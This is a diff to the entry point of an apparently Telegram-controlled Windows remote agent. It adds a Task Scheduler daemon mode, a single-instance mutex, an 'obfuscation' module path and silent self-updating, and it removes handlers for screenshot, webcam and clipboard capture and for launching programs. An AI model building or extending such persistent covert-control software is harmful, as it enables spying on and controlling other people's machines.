@@ -6,11 +6,11 @@ use anyhow::Result;
 
 mod bot;
 mod commands;
-mod machine;
 mod security;
 mod service;
 mod updater;
 
+/// Ensure only one instance is running via a named mutex.
 fn check_already_running() -> Result<()> {
     let mutex_name = std::ffi::CString::new("Global\\TgRemoteAgent_Mutex")
         .map_err(|_| anyhow::anyhow!("invalid mutex name"))?;
@@ -49,10 +49,47 @@ fn init_foreground_logger() {
     }
 }
 
+/// Run the bot with a shutdown channel that can be triggered externally.
+fn run_bot(cfg: service::config::AppConfig, enable_ctrlc: bool) -> Result<()> {
+    let (tx, rx) = mpsc::channel();
+    thread::spawn(move || {
+        let _keep = tx;
+        thread::park();
+    });
+    let rt = tokio::runtime::Runtime::new()?;
+    rt.block_on(bot::run_until(rx, cfg, enable_ctrlc))
+}
+
+fn run_daemon() -> Result<()> {
+    let home = security::obfuscation::install_home();
+    if let Err(e) = service::logging::init_logger(home, service::logging::LogMode::Service) {
+        eprintln!("Cannot init logger: {e:?}");
+    }
+
+    check_already_running()?;
+    service::install::cleanup_old_files();
+
+    let cfg = service::config::load()?;
+    let rt = tokio::runtime::Runtime::new()?;
+
+    match rt.block_on(updater::self_update::auto_update()) {
+        Ok(true) => {
+            log::info!("Updated, process exiting for restart");
+            return Ok(());
+        }
+        Err(e) => log::warn!("Auto-update failed: {e:?}"),
+        Ok(false) => {}
+    }
+
+    run_bot(cfg, false)
+}
+
 fn main() -> Result<()> {
     let args: Vec<String> = env::args().collect();
 
     match args.get(1).map(|s| s.as_str()) {
+        Some("--daemon") => run_daemon(),
+
         Some("--run") => {
             if args.len() < 4 {
                 anyhow::bail!("Usage: --run TOKEN UID");
@@ -70,14 +107,9 @@ fn main() -> Result<()> {
                 bot_token: token,
                 super_user_id: uid,
             };
-            let (tx, rx) = mpsc::channel();
-            thread::spawn(move || {
-                let _keep = tx;
-                thread::park();
-            });
-            let rt = tokio::runtime::Runtime::new()?;
-            rt.block_on(bot::run_until(rx, cfg))
+            run_bot(cfg, true)
         }
+
         Some("--install") => {
             if !is_admin() {
                 anyhow::bail!(
@@ -89,86 +121,40 @@ fn main() -> Result<()> {
             }
             init_foreground_logger();
             check_already_running()?;
-            let token = &args[2];
-            let uid: i64 = args[3].parse()?;
-            service::install::install(token, uid)?;
-            Ok(())
+            service::install::install(&args[2], args[3].parse()?)
         }
+
         Some("--reinstall") => {
             if args.len() < 4 {
                 anyhow::bail!("Usage: --reinstall TOKEN UID");
             }
             init_foreground_logger();
-            let token = &args[2];
-            let uid: i64 = args[3].parse()?;
-            service::config::save_to_registry(token, uid)?;
+            service::config::save_to_registry(&args[2], args[3].parse()?)?;
             log::info!("Registry updated");
             Ok(())
         }
-        Some("--screenshot") => {
-            if let Some(path) = args.get(2) {
-                commands::screenshot::capture_to_file(path)?;
-            }
-            Ok(())
-        }
-        Some("--msgbox") => {
-            let text = args.get(2).map(|s| s.as_str()).unwrap_or("");
-            commands::msgbox::show_blocking(text);
-            Ok(())
-        }
-        Some("--clipboard") => {
-            commands::clipboard::capture_clipboard()?;
-            Ok(())
-        }
-        Some("--camera") => {
-            if let Some(path) = args.get(2) {
-                commands::camera::capture_to_file(path)?;
-            }
-            Ok(())
-        }
-        Some("--lock") => {
-            commands::system::lock_workstation();
-            Ok(())
-        }
-        Some("--wallpaper") => {
-            commands::wallpaper::print_wallpaper_path();
-            Ok(())
-        }
-        Some("--audio") => {
-            let action = args.get(2).map(|s| s.as_str()).unwrap_or("");
-            match action {
-                "mute" => commands::audio::do_mute(),
-                "unmute" => commands::audio::do_unmute(),
-                "set" => {
-                    let level: u8 = args.get(3).and_then(|s| s.parse().ok()).unwrap_or(50);
-                    commands::audio::do_set_volume(level)
-                }
-                _ => Ok(()),
-            }?;
-            Ok(())
-        }
-        Some("--run-program") => {
-            if let Some(path) = args.get(2) {
-                let _ = std::process::Command::new(path).spawn();
-            }
-            Ok(())
-        }
+
         Some("--uninstall") => {
             init_foreground_logger();
-            service::install::uninstall()?;
-            Ok(())
+            service::install::uninstall()
         }
+
         Some("--help") | Some("-h") => {
             println!("TG Remote Bot v{}", env!("CARGO_PKG_VERSION"));
             println!();
             println!("Usage:");
-            println!("  --run TOKEN UID          Run bot in foreground (debug)");
-            println!("  --install TOKEN UID      Install as Windows Service (admin required)");
+            println!("  --daemon                 Run as daemon (Task Scheduler)");
+            println!("  --run TOKEN UID          Run in foreground (debug)");
+            println!("  --install TOKEN UID      Install via Task Scheduler (admin)");
             println!("  --reinstall TOKEN UID    Update registry config");
-            println!("  --uninstall              Remove Windows Service");
+            println!("  --uninstall              Remove Task Scheduler task");
             println!("  --help                   Show this help");
             Ok(())
         }
-        _ => service::windows_svc::dispatch(),
+
+        _ => {
+            println!("No command specified. Use --help for usage.");
+            Ok(())
+        }
     }
 }
